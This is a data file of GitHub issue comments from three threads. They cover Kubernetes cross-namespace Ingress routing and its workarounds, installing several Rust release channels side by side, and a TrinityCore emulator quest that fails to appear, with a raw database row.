kubernetes/kubernetes/17088/276406373,"@friend yes. It depends on their implementation, but most of the controllers monitor all the namespaces on default (which is changeable) ",,False,False,17088
kubernetes/kubernetes/17088/276683352,"@friend thanks for your help, however I believe that it is not possible to change the namespace of an ingress object using  In this operation I attempted to change the namespace of the Ingress resource to , where it was previously . Additionally if I delete this (my only) Ingress resource, I lose the IP address which Google Cloud load balancing has provisioned for me. Perhaps this behaviour would change if I had another Ingress resource. ",,False,False,17088
kubernetes/kubernetes/17088/277889816,"one thing i don't seem to be able to understand is why insist on ingresses not being able to use services from other namespace, when there aren't any security measures in place (as far as i know) to prevent any pod from just using the  fqnd to get data from another namespace.  or is the fact, that this is possible a security flaw, that will be fixed in future versions? update this is what i mean ",,False,False,17088
kubernetes/kubernetes/17088/277891333,@friend I believe the intent is that cross namespace service access will not be allowed in the future. ,,False,False,17088
kubernetes/kubernetes/17088/277892880,"put then the question still stands why not have a certain kind of flag or even  to allow cross-namespace access to certain pods or have a service definition which namespaces they can be accessed from. without this there would be a nn (namespaceingress-host) relation between namespace and hosts that expose them, while it would be nicer to have a n1 relation to cut down on costs for additional public facing static-ip hosts. ",,False,False,17088
kubernetes/kubernetes/17088/278138993,"@friend I'm not familiar with how the Google Cloud router works with Ingress right now. However. If you use the nginx ingress controller and point a LoadBalancer at the ingress controller you will get what you want - a single stable IP address TCP load balancer created by the Service pointing to a horizontally scaleable nginx layer. Moving Ingress objects between namespaces just updates the Nginx configuration, and does not release any IP addresses. It'll also give you more direct control over how the router works, and might save money on Google Cloud resources. The Google Cloud implementation SHOULD keep a single IP address and make HTTP rules in that balancer to point to however many Ingress objects exist in the cluster - that might not be the case right now. ",,False,False,17088
kubernetes/kubernetes/17088/278300374,"@friend thanks for the suggestion, I haven't tested it, however I am leaning towards a similar solution for my specific requirement by using a LoadBalancer as you suggest to point to my own nginx-based router's service. This approach uncovered a bug in , see #40870. I'm afraid that I have currently put this issue down while I am working on other priorities, but I will be able to return to this problem and conduct some conclusive tests of this suggestion and other suggestions in this thread. I apologise that I don't have time to do this right now. I also think that, so far, efforts in achieving my goal should be documented in a new thread entitled ""Support blue/green deployments"", as this issue is very clearly ""support cross-namespace ingress"" and the answer seems to be a firm ""no, we won't"". ",,False,False,17088
kubernetes/kubernetes/17088/278301972,"@friend in my instance, my frontend app connects to its component services using DNS as service discovery. They connect to a static name, e.g.  or . By deploying different versions in different namespaces, we get 100% satisfactory service discovery. We are unwilling to implement a different method of service discovery for the following reasons  More complexity brings more opportunity for failure. More per-deployment environmental configurations brings more opportunity for failure through less deployment parity. Our local dev setup is using pure Docker networking which is compatible with this DNS-based approach (which is a design feature of , I believe).  We are very satisfied with this approach in every way, with the exception that cross-namespace load balancing (switching) is impossible with pure-k8s at the moment. ",,False,False,17088
kubernetes/kubernetes/17088/278302853,"@friend at some point between you making this comment and today, this functionality regressed. See #40870. I would appreciate it if you could accelerate @friend's request for a second opinion on that thread please! ",,False,False,17088
kubernetes/kubernetes/17088/278368093,"If you need a huge design change in something like Kubernetes to do a relatively common deployment pattern, you're doing it wrong. I rest my case, but urge you to rethink your approach. Reread the docs on how DNS and pod ips work, particularly around multiple / cross namespace communication. Namespaces are used usually in a one namespace per deployment fashion - one for prod, dev, etc although the isolation they provide can be used for other things too. ",,False,False,17088
kubernetes/kubernetes/17088/278374265,"@friend please re-read my response to your suggestions. You suggested using a LoadBalancer service to direct traffic to the correct endpoint. I have tried this and this functionality does not work as described in the documentation. I tried your suggestion of multiple Ingress resources, and that didn't work. I also took inspiration from this, and tried having multiple Ingress resources in different namespaces, and changing which HTTP host they were configured for. This also didn't work - traffic was never re-routed, and I could confirm that the underlying Google Cloud routing rules had not been updated. I apologise for not reporting this, however at that point I had already given up on using Ingress for my solution - I understand and accept that this is not what it's for. I have merely been replying to your suggestions. That is why I intend to open a new issue, as I have not yet seen any workable solutions that function as advertised. I'm not sure why you have now taken this hostile attitude, but I am disappointed that you seem to think I am stubbornly ignoring your help. Trust me, I am VERY eager to solve this problem. Thank you for continuing to help me, but please could I ask that if you think you have suggested workable solution, could you re-iterate it so there is less confusion between what you think works, and what I think works? ",,False,False,17088
kubernetes/kubernetes/17088/278382428,"You've still not read and understood my suggestion, which means at this point you're probably skipping reading anything I'm posting at all. Remember that I'm the one that made this issue in the first place, and yes, I was in the exact same position with the exact same deployment model as you. I suggested using a Nginx Ingress Controller from the official kubernetes ingress controller implementations, and directing a load balancer at that ingress controller to get a stable IP. From what you've said above it seems you misunderstood. This is exactly what ingress is for, so don't give up yet. ",,False,False,17088
kubernetes/kubernetes/17088/278406079,"OK, I think I understand your suggestion, but let me play that back to you  Create an nginx Ingress Controller so that we have something we can route to. Create a LoadBalancer service and include the Ingress Controller in its selector. OK great, now we have a single IP, all Ingress resources are served under this IP. Create an Ingress resource under some given namespace, and specify our app's HTTP endpoint service as the backend. We're now serving our live app.  All good so far.  Now, we want to serve the new release. What happens? Delete the Ingress resource in the previous namespace, and create the same Ingress resource in the new namespace? OK... that will cause a service interruption, but maybe I can live with that.  Now we're serving the newest release with a small loss of service.  Next up, we want to test the development release (as per the blue/green pattern). It's deployed to a new namespace. Problem - how do I route traffic to it? Any Ingress resource can only use the single LoadBalancer IP I first created, so I can't differentiate the traffic as I can't add another IP. Unless... I use the hostname-based routing functionality of Ingress? I guess we can additionally configure static DNS names, but it's extra complexity.  If this is what you're suggesting, then I'm not really inclined to proceed with Ingress, and would rather pursue the service-to-service approach as described in the documentation and suggested by thockin. However, I can see that it would just about fit our use-case, so thank you. ",,False,False,17088
kubernetes/kubernetes/17088/278437624,"Ingress is designed to do http level routing of traffic while services do TCP level routing. For your use case I would use a subdomain to route to the dev environment for sure. Usually people don't switch entire namespaces to do deployments, so kubernetes isn't designed towards that model as heavily. However, I can understand why you're doing it, and I definitely think you'll do fine with this approach. You shouldn't see a service interruption by the way if you do it with a script that swaps them around immediately. The nginx config should be updated immediately and nginx doesn't have to restart to apply the change and start rerouting traffic. ",,False,False,17088
kubernetes/kubernetes/17088/279699396,"@friend I think the main confusion here is due to how Google Container Engine behaves. My first expectation on how Ingress should work was exactly what you described Simply have multiple  resources and the ingress controller will make all of them available on the same node port / IP address to the outside world, right? But then I tested this And this is what I got on Google Container Engine  You can see that there are two public IP addresses now, one for each ingress. So I thought Apparently my mental model on how ingresses are supposed to work is wrong, let's look some more at the documentation  Ah! The documentation suggests to use a single ingress if you want to have a single IP address. All right, seems to work in a single namespace, let's try to add services from other namespaces...  What? Now what am I supposed to do? And that's how I ended up at this issue. I hope that this shows why the model of ingresses that you describe (and which I would prefer) is not what we get by default on GKE. Maybe we are supposed to not use the default ingress controller created by GKE, but that really is not obvious. How can we improve this situation? ",,False,False,17088
kubernetes/kubernetes/17088/279713442,"@friend you're right, the GCE controller behaves differently than one might expect, and from how I think it's supposed to work, at least from how the developers explain it in this thread. Maybe open another issue? This one is too far gone I think. ",,False,False,17088
kubernetes/kubernetes/17088/279733788,"@friend, I had the same confusion initially. Container Engine's ""L7"" ingress controller isn't implemented using the familiar model that others have described here. It actually provisions an HTTP/S load balancer per ingress. Besides not being what you want, that could also be costly. fwiw, I highly recommend dumping that ingress controller. I think you can just uninstall it, but a more resilient option could be to annotate your ingress resources in a way that will make that ingress controller ignore them. Then you're free to install some other ingress controller and let it handle things differently than Google's does. I prefer Traefik, personally, so I use the following annotation My understanding is that the Container Engine ingress controller will ignore any ingress annotated with  != . Hope that helps. ",,False,False,17088
kubernetes/kubernetes/17088/279761468,"I have tried Nginx now and it works fine. I'll also take a look at Traefik. So you and me have figured it out, but others will probably run into it again and again. Google Container Engine is one of the easiest ways to try/use Kubernetes and obviously people try the preinstalled ingress controller first. How can we bring this up with the right people? The Kubernetes project is not directly responsible for GKE, right? ",,False,False,17088
kubernetes/kubernetes/17088/279772526,It is. GLBC is written by the same devs in the same repos ,,False,False,17088
kubernetes/kubernetes/17088/279779252,I filed  that seems like the right place. ,,False,False,17088
kubernetes/kubernetes/17088/306719946,"My use case is  jenkins, grafana, etc. in different namespaces I want a single ELB with Ingress per namespace  so the question is, will it work right now? if not, why? ",,False,False,17088
kubernetes/kubernetes/17088/307840482,"Sorry if this is wrong discussion, just want to describe my case. I have some developer teams working on one complex product. Product is splitted to semi-independent parts, each of particular parts is developed by its own team and namespaced respectively. Everything was great before marketing team demand us to change components addressing from  to . So for now we still have namespaces with own ingresses for every component, but it's absolutely impossible to build ingress resource for ""main"" part, because of structure like this is invalid spec   rules   - host domain.com     http       paths       - component1           namespace component1           serviceName component1           servicePort 80         path /component1       - component2           namespace component2           serviceName component2           servicePort 80         path /component2       - ...  Any chances to use ingress resources in this case, or I need to build homebrewed NGINX configuration to achieve this requirement? Thanks in advance! ",,False,False,17088
kubernetes/kubernetes/17088/307849868,@friend what ingress controller are you using? If is the nginx ingress controller then you just need to split de definition of the ingress (to be able to reference services from different namespaces) Like and the controller will merge the paths under the same nginx server ,,False,False,17088
kubernetes/kubernetes/17088/307860778,"This is what people fail to understand... An ingress controller can read in multiple Ingress objects and build a single config to direct traffic, it's not 1 ingress &lt;-&gt; 1 controller... ",,False,False,17088
kubernetes/kubernetes/17088/307866998,With the default GKE ingress controller it is 1 ingress &lt;-&gt; 1 domain or IP addy. ,,False,False,17088
kubernetes/kubernetes/17088/307878434,"@friend oh, looks like I got it at last! Thank you, will try it in the morning. ",,False,False,17088
kubernetes/kubernetes/17088/307878917,@friend I'm still interested Which ingress controller were you using? ,,False,False,17088
kubernetes/kubernetes/17088/308077354,@friend NGINX by kubernetes team ,,False,False,17088
kubernetes/kubernetes/17088/313191717,"Probably out of context, but how does the Nginx controller by kubernetes differ with the one provided by nginx? And which one is preferred and why? I was trying the approach suggested by @friend on nginx plus controller by nginx but it does not seem to work. ",,False,False,17088
kubernetes/kubernetes/17088/314713077,"For scenario “Bregor commented on Jun 13”, the solution from ""aledbf commented on Jun 13"", not work . Here is example in AWS Per solution, each namespace must generate one ELB (load balance) However, in AWS route 53, one domain www.abc.com can only point to single ELB (load balance). So, you cannot combine all namespace api into one domain www.abc.com You have to divide api into different sub-domain by namespace. namespace1.abc.com namesapce2.abc.com namespace3.abc.com ",,False,False,17088
kubernetes/kubernetes/17088/314749934,"@friend The issue is about cross-namespace rule definitions in ingress. You seems to have conceptual problem on AWS, even before the traffic goes to k8s cluster. If you choose single domain you are stick to single ELB. If you are using subdomains, you are free to choose - single/multiple ELB. You have to choose. PS. To generate many ELB create multiple kubernetes services (type LoadBalancer) with identical selector pointing to same ingress-controller. ",,False,False,17088
kubernetes/kubernetes/17088/315026293,"I can confirm that we made work cross namespace on GKE 1.6.4 and traefik. The trick was to use the current (2017-07-13) stable helm. Then, every namespace can have its ingress (referencing its own services) and the main controller aggregates the routes. Just awesome. ",,False,False,17088
kubernetes/kubernetes/17088/315037519,This is exactly the same as currently nginx controller works. The issue is to enable in single namespace reference to services in other namespace. Such feature is implemented in voyager ingress controller  apiVersion voyager.appscode.com/v1beta1 kind Ingress metadata   name test-ingress   namespace foo spec   rules   - host foo.bar.com     http       paths       - backend           serviceName s1.bar # serviceName.Namespace           servicePort '80'  ,,False,False,17088
kubernetes/kubernetes/17088/359160378,When you create an ingress you intentionally think it is build around a loadbalancer or controller. That leads to the thinking that there can be just one. And you would expect to add namespace here If documentation would emphasize that ingress is build around namespaces it would make it obvious that there can and must be many. ,,False,False,17088
kubernetes/kubernetes/17088/375695402,"I started using GKE, after years of using home grown clusters with the nginx ingress, and was surprised by the IP per Ingress behaviour of the default ingress controller. I thought I could get around this by using a single ingress file in the kube-system namespace that aggregated all host/paths -&gt; service rules but it turns out I cannot reference services in other namespaces. Is there a better option other than dumping the default controller for the nginx controller or manually creating endpoints for a service without selectors? ",,False,False,17088
kubernetes/kubernetes/17088/375785460,"I think nobody is AGAINST a broader solution, but there are conflict-resolution rules that need to be decided and access control issues to work out.  I'd live to see a proposal. On Fri, Mar 23, 2018 at 806 AM André Cruz notifications@friend.com wrote ",,False,False,17088
kubernetes/kubernetes/17088/393131724,"My situation is the following Using kops in AWS. I have staging application deployment which lives in default namespace  and production deployment which lives in production namespace. Application consists of two services, one service should be exposed publicly and the other service should be private (i.e. use internal load balancer) There are 2 nginx ingress deployed, one per namespace. Ingress in default namespace is exposed with internal LB and Ingress in production NS is exposed with public LB. I decided that staging services should be exposed via internal load balancer and live in default namespace. When it comes to production main service should use public load balancer and the second service should use internal load balancer. So here comes the problem, that it would be nice that ingress controller in default namespace could access the service(exposed internally) in production namespace... I ended up with the solution  production service that needs to be accessed internally is deployed in default NS alongside with staging deployment. That service is connected to the database that lives in production NS with full DNS name.. I believe that architecture is not perfect and confusing. Being able to access services in different namespaces I could deploy all production services into production NS ",,False,False,17088
kubernetes/kubernetes/17088/394313647,my workaround  serviceA in namespaceA create serviceB in namespaceB  add ingress rule into ingressB in namespaceB   ,,False,False,17088
kubernetes/kubernetes/17088/396527254,I first came across this issue a few months ago and after reading it too quickly I was still confused. After a recent second read I realised that my requirement was actually really easy to achieve with the NGINX Ingress Controller. I've written this up as an article on Medium. I hope someone else finds it useful. ,,False,False,17088
kubernetes/kubernetes/17088/396612130,"cesartl, Came to same solution by myself, but it is not working. Ingress installed via helm to kube-system namespace with ""rbac create"" option. ",,False,False,17088
kubernetes/kubernetes/17088/396895911,"hi @friend, I've installed the Ingress Controller manually and it works well. I've actually updated the article above to show how to use Ambassador, perhaps this is a better solution for you? ",,False,False,17088
kubernetes/kubernetes/17088/397726856,"Hi, @friend  Thanks for awesome job. Anyway, I finally made it, but outside of rancher. ",,False,False,17088
kubernetes/kubernetes/17088/399061736,"For Google Kubernetes Engine (GKE) specifically, I have written a step by step guide here for setting up nginx ingress controller to route traffic across cross namespace ingress resources  @friend for your post, it was very helpful in getting somethings off ground for me. ",,False,False,17088
kubernetes/kubernetes/17088/402745731,"Hi @friend , Thanks a lot for your post, it actually helps a lot ! But I'm still stuck on the last step  I tried a sample use-case with a quick nginx deployment as a test web server (yeah using a proxy as a test server is a little weird, ;)), and I'm trying to contact this server using the ""Ambassador"" option. =&gt; when I use kube-ctl port-forward on the nginx pod, I can display the test page without issue. =&gt; when I use the ELB built by ambassador, I get a ""no healthy upstream"" error. In a way, it means that the ambassador annotations are correctly detected and ambassador is trying to do something, but it just doesn't work (I think this error is coming from the envoy proxy, but this is where we reach my limits on the subject ;)) Would you have any idea of the possible root cause / how to debug this ? Ambassador config  exactly a copy-paste of the tutorial, except that  I created everything in the ""ambassador"" namespace I have ""use-proxy-proto"" to ""true"" instead of ""lower"" (I think it was a typo)  Test nginx deployment (note  I deployed nginx in the ""default"" namespace)  Test nginx service Thanks ! ",,False,False,17088
kubernetes/kubernetes/17088/402987834,"Hi @friend, I don't think this issue is the best place to discuss that. You can always discuss with the Ambassador team or their Gitter or the new slack here I'm not an Ambassador expert but I can try to help you there. ",,False,False,17088
kubernetes/kubernetes/17088/420162527,"What's the argument against referencing a service in another namespace in an ingress? With workarounds like  it would seem whatever supposed security benefits are nonexistent. With the ingress-nginx controller, the ability to inject arbitrary nginx config via nginx.ingress.kubernetes.io/server-snippet means I can essentially emulate cross-namespace service references, but in a janky and error-prone manner. So why not relax this restriction, and let us do what we are already able to do via workarounds, and let us do it cleanly. ",,False,False,17088
kubernetes/kubernetes/17088/420178054,"The recommendation of @friend to split the ingress from the service worked for us but because we also use cert-manager and an OAuth proxy, having two different ingress objects in two different namespaces caused cert-manager to generate the SSL cert with Let's Encrypt twice.  It would've been better to be able to reference the OAuth proxy in the other namespace to avoid procuring the cert twice. ",,False,False,17088
kubernetes/kubernetes/17088/420374817,@friend We have a similar use case where we use an oauth2 proxy and we really don't want to run one in every namespace. ,,False,False,17088
kubernetes/kubernetes/17088/456590082,"I'm sorry to resurrect a dead thread, but we definitely need this. Our reasoning is this. Let's say we have n number of api's. As n grows we want to create some apis that should be cross cutting in that all teams use them, but managed by one team. It is impossible to manage x number of cross cutting apps in every namespace. So we need to have this cross cutting api in its own namespace for security/managibility reasons. The biggest being since we are now proxying to a new namespace, we can request a new audience for our token, and not bloating the original token. Ingress is by definition a reverse proxy. So it should be easy enough to set ",,False,False,17088
kubernetes/kubernetes/17088/456598371,@friend This seems like something that could be better solved by a service mesh like istio? ,,False,False,17088
kubernetes/kubernetes/17088/474737592,"I tried,but i got error like this ♠Error resolving host ""serviceB.namespaceB.svc.cluster.local"" lookupserviceB.namespaceB.svc.cluster.local on 114.114.114.11453 no such host` It seems like ingress controller using public dns to resolve this hostname. And k8s doc says  ""ExternalNames that resemble IPv4 addresses are not resolved by CoreDNS or ingress-nginx because ExternalName is intended to specify a canonical DNS name. "" ",,False,False,17088
kubernetes/kubernetes/17088/474756610,My solution Target using ingress in namespaceB to access serviceA in namespaceA Solution create endpoint in namespaceB point to the clusterIP of serviceA like this ,,False,False,17088
kubernetes/kubernetes/17088/475088747,My solution ,,False,False,17088
kubernetes/kubernetes/17088/477229061,"This solution is not working in GKE. It only allows me to use LoadBalancer or NodePort when I'm trying to reference my service with type as externalName. My workaround was to go a bit lower and fire up an nginx pod in namespace A and point that to my service in namespace B, so I can use my nginx pod's service for the ingress in namespace A. ",,False,False,17088
kubernetes/kubernetes/17088/482223813,Worked for me. Thanks ,,False,False,17088
kubernetes/kubernetes/17088/495034468,"How? GKE does not allow ExternalName and asks for NodePort or LoadBalancer. Any news on that issue? The workarounds do not work for me, since I consider using GCLB (anycast) for multi cluster. Thanks ",,False,False,17088
kubernetes/kubernetes/17088/498175305,"The ExternalName approach doesn't work on GKE as canmanmake pointed out, here is the error message for people googling this issue. ",,False,False,17088
rust/rust-lang/19263/49867490,"Rust is going to have three release channels stable, beta, and nightly. Each of them has its use (that’s why they exist), so it will probably be common to have more than one of them installed at the same time on the same machine (such as a developer’s laptop). Currently, this it is possible to install multiple rusts at different locations, and set up the  and (since the [rpath removal])  environment variables to pick one of them. However this is error-prone and not very convenient. It would be better if multiple versions could be installed in the same ""prefix"" (e.g. , where the default environment variables Just Work&lt;sup&gt;®&lt;/sup&gt;). Executables could have a suffix to distinguish them, for example  (stable),  and . Other files would have to be namespaced somehow to avoid conflicts. (Corresponding Cargo issue ",,False,False,19263
rust/rust-lang/19263/64188991,"Semi-related I have been wondering whether we should start distributing a wrapper script for invoking  that sets up the  and other environment variables appropriately. I saw a user recently who untarred the  binary package and tried to copy  into a different location.  I advised them to ""just install it globally"", but I would prefer to have some support for the use case where you do not install the distribution into .  I have been maintaining my own private script for supporting this, but it would probably be good to determine what our general attitude is about this.  (That is, if the team thinks we can stomach supporting a wrapper script, then I can work on making my own script more robust and making it distributable.  If the team hates the idea of a wrapper script ... well, then that's unfortunate given that we've also discarded using rpaths...)  Update Oh, the reason that this is related to this topic is that a wrapper script can be written to support multiple release channels, either by having multiple scripts that point to the different spots as necessary, or by having a single script that reflectively dispatches on , i.e. guessing based on whether we see  or  in the script's name. ",,False,False,19263
rust/rust-lang/19263/64192398,"There is endless precedence for this kind of tooling in the Ruby/Python worlds, and it's quite useful. ",,False,False,19263
rust/rust-lang/19263/64192730,"@friend, right. At some point we might also want to do this by version numbers (e.g. have Rust 1.3 next to 1.4) in addition to release channels. ",,False,False,19263
rust/rust-lang/19263/64284909,The obvious problem with putting a bunch of same-named libraries next to each other is that they are going to cause resolution conflicts. We might resolve that by attaching a unique id to each build of the compiler and associating every library with that build. That will have some impact on distributing binary libs (which presumably nobody does currently). The docs are also going to cause naming conflicts as well as some of the other supplementary files. Have to consider all the different ways of installing Rust and whether and how to make them all compatible with multi-rust. ,,False,False,19263
rust/rust-lang/19263/64285417,"Note that our makefiles specify a 'extra filename' paramter to be mixed into all filenames  could tweak that per-release channel in theory. The binaries themselves won't have it mixed in, though (just the libs). ",,False,False,19263
rust/rust-lang/19263/64395752,"I agree with @friend .  It should suffice to extract as many TAR archives as the user wish under the common ""base"" directory in a parallel manner.  They can coexist and uninstalling one of them is as simple as . *nix We can simply provide a wrapper shell script to choose one of multiple installations We can enhance this wrapper following battle-tested tools such as  (Ruby),  (Python), or  (Node.js)  (Several similar tools exist for each language;  I'm not claiming they are the best ones for their languages.) To those who likes nitpicking not setting  properly is caller's fault. Windows The idea is the same as the *nix case.  Instead of , we can implement a wrapper executable which calls  to locate the base directory  ",,False,False,19263
rust/rust-lang/19263/64407819,"@friend another option for Windows is a wrapper  script.  You can use the variable  which expands () into the drive () and path () for the batch file ().  See also  do not do much Windows hacking; I just remembered that we used a trick like this in the Larceny project larceny.bat, and I think a batch file will be easier for end-users to modify/maintain than a wrapper executable.) ",,False,False,19263
rust/rust-lang/19263/64408743,"It’s maybe not as essential that all of the ways to install support this, as long as some of them do. In particular, the packages for Rust release and nightly in my distribution currently conflict, and I’d like them not to ) IMO it’s ok if packagers need to do a small amount of work (like passing the right  flags) to make this happen. ",,False,False,19263
rust/rust-lang/19263/68322110,I have a project that supports installation of multiple Rusts  It depends a bit on the upcoming release channel and installer infrastructure. ,,False,False,19263
rust/rust-lang/19263/74616255,"Hello, I am a co-maintainer of rust on Gentoo. Are there any updates on this issue? What is the appropriate way to install multiple release channels? Thanks much, William ",,False,False,19263
rust/rust-lang/19263/74616834,"I believe the compiler itself can add support for things (though I’m not sure what exactly) to make this easier. In the meantime Brian has been working on  , which I believe is the best we can do right now. You probably don’t want to import it as-is into the Gentoo packaging system, but you could take ideas. Specifically, it ""installs"" different Rust versions in different directories. (It just extracts tarballs with pre-built binaries, but I believe it’s equivalent to building with .) Then, wrapper scripts run executables from one install or another after setting up the environment, most importantly the  variable. ",,False,False,19263
rust/rust-lang/19263/93385609,Triage multirust has matured significantly. ,,False,False,19263
rust/rust-lang/19263/106747812,"Here's one unfortunate case where multirust doesn't help, and other than bringing back rtool I'm not sure what will. It seems like it should be a non-negotiable requirement that one can run a program after building it without having to invoke any black magic between build and run. ",,False,False,19263
rust/rust-lang/19263/122322809,"@friend Just to mention it, Gentoo deals with multiple rust installations already and names them e.g.  and manages a symlink using . So there is the overlay called rust (obviously) which contains the special versions rust-9999 (git) and rust-999 (nightly). Would it be possible to have rust (binary named *-stable), rust-beta and rust-nightly in this repo? Then I could manage my versions (which are updated as expected by the package manager) using eselect for the default compiler and still use rustc-beta and rustc-nightly or rustc-9999 for the other versions. This way I could test libraries much more easily for stable/beta/nightly compatibility. Edit Sorry, I did not see before that the portage (non-overlay) is also ruststable and the rust-999 of the overlay is rustnightly. Still, the beta is missing. ",,False,False,19263
rust/rust-lang/19263/130843650,"I believe multirust is basically our answer here, so closing, yay! ",,False,False,19263
rust/rust-lang/19263/130845664,Now if only we had a Windows equivalent! ,,False,False,19263
TrinityCore/TrinityCore/11476/25898610,Magistrix Landra Dawnstrider is missing the quest 9395 (Saltheril's Haven) WoWHead.com info say     Level 9     Requires level 8     Side Horde     Start Magistrix Landra Dawnstrider     End Lord Saltheril     Sharable     Difficulty 8  12  15     Added in patch 4.0.1 &lt; This is incorrect as it was added way before 4.0.1 I know because I played official since Vanilla and I made many Blood Elves even in WotLK 3.3.5. using Zygor Quest Guide takes you to her to accept quest but quest is not in log. Zygor Quest Guide follows the Vanilla Questing to a tee and I made sure I had the 3.3.5 Version of the quests guides so no mishaps like this happen Series  Saltheril's Haven The Party Never Ends  Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) so why would the quest not populate and show up in-game? Level requirements were met faction requirements also met and the pre-quest 9255 (Research Notes) was completed which should make quest 9395 Available immediately. manually adding the quest does properly accept the quest. .quest add 9395 ,,False,False,11476
TrinityCore/TrinityCore/11476/32737596,"It may be in the disables table, if a manual add isn't working for it. ",,False,False,11476
TrinityCore/TrinityCore/11476/32738245,no manually adding it does work which is what confuses me on why it's not available when the appropriate requirements are met ,,False,False,11476
TrinityCore/TrinityCore/11476/32738504,"Ok. Then it's simply not in creature_queststarter table. With the manual add, can it be properly handed-in? If not, then you need to add the appropriate creature_questender table entry, too. ",,False,False,11476
TrinityCore/TrinityCore/11476/32739022,"it is in that table ""Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) "" and yes it can be handed in correctly which is why I'm baffled by this. and prequest 9255 is properly linked in both tables ",,False,False,11476
TrinityCore/TrinityCore/11476/32739254,Check the quest_template table and verify the RequiredRaces column. ,,False,False,11476
TrinityCore/TrinityCore/11476/32739317,says 650 is that correct I forget where to check that it's available to all HORDE not just bloodelves. ,,False,False,11476
TrinityCore/TrinityCore/11476/32739321,Look for wrong conditions. ,,False,False,11476
TrinityCore/TrinityCore/11476/32739346,untaught how do i do that? ,,False,False,11476
TrinityCore/TrinityCore/11476/32739389,  Have no time right now but when I get back I'll look at the issue. ,,False,False,11476
TrinityCore/TrinityCore/11476/32739401,650 is wrong. It should be 690 for WotLK or before and 946 for Cata and later (added goblin in Cata). ,,False,False,11476
TrinityCore/TrinityCore/11476/32739476,"OK thanks untaught, i'll check that section now Kylroi and post if that fixes it ",,False,False,11476
TrinityCore/TrinityCore/11476/32739513,No conditions for that quest. It must be the RequiredRaces column set wrong. ,,False,False,11476
TrinityCore/TrinityCore/11476/32739519,yes the required race is 690 I guess I miss read it when I thought ,,False,False,11476
TrinityCore/TrinityCore/11476/32739544,"9067    2   9   7   0   3430    0   0   0   0   690 0   0   0   0   0   0   0   0   0   0   9395    0   0   0   5   900 480 0   0   0   0   0   0   0   0   0   136 0   0   0   0   0   23500   0   0   0   1   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   911 0   0   0   0   5   0   0   0   0   0   0   0   0   0   0   0   0   0   The Party Never Ends    Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.   I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!        You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.   Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?    Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.    0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   22775   22776   22777   0   0   0   1   1   1   0   0   0   1                   0   0   0   0   0   0   0   0   0   1   0   0   0   0   0   0   0   0   12340 ",,False,False,11476
TrinityCore/TrinityCore/11476/32739558,that's a big mess ugh lol ,,False,False,11476
TrinityCore/TrinityCore/11476/32739628,"Indeed. Is that the quest_template? If so, they really changed that structure between 3.3.5a and 4.3.4. ",,False,False,11476
TrinityCore/TrinityCore/11476/32739685,Here's the 4.3.4 listing ,,False,False,11476
TrinityCore/TrinityCore/11476/32739701,yes that's the quest template for the issue quest ,,False,False,11476
TrinityCore/TrinityCore/11476/32739842,"So, 9067 lists 9395 as the next quest, and 9395 lists 9067 as the previous quest. However, the core doesn't give you 9395 when you complete 9067? ",,False,False,11476
TrinityCore/TrinityCore/11476/32739961,exactly and the level requirement is level 8 min and I was level 10 and still was not available... it's a odd bug probably something very minute could even be on my end but for the love I just cannot figure it out. ,,False,False,11476
TrinityCore/TrinityCore/11476/32740160,"Well, yes, it's your end. You're using WoW emulation instead of a retail server. heh Seriously, though, it's sounding like a bug that was introduced in some of the code changes that have been going on. All I know it that when they try to merge some of those master branch changes, they royally mess up the 4.3.4 branch (current commit revision won't even compile all the way due to an incomplete merge, but that will likely be fixed in a day or so). ",,False,False,11476
TrinityCore/TrinityCore/11476/32740291,Could you post the SQL export of the 2 quests (similar to the way I posted the 4.3.4 version)? Which SQL client do you use? ,,False,False,11476
TrinityCore/TrinityCore/11476/32740555,"i use navicat for windows to browse the database but for uploaded all the sql files i used ""mysql -u username -p  DATA-BASE-NAME &lt; data.sql "" from my linux console. I know everyone says ""don't use navicat"" but i've never had problems with it since mango's or trinity when i have done it locally but I didn't bother importing the dump's over the net like i said i used that bash command to upload them via linux directly &lt;code&gt; 9067;2;9;7;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9395;0;0;0;5;900;480;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;23500;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;5;0;0;0;0;0;0;0;0;0;0;0;0;0;The Party Never Ends;Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.;I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!;;You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.;Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?;Return to Lord Saltheril at Saltheril's Haven in Eversong 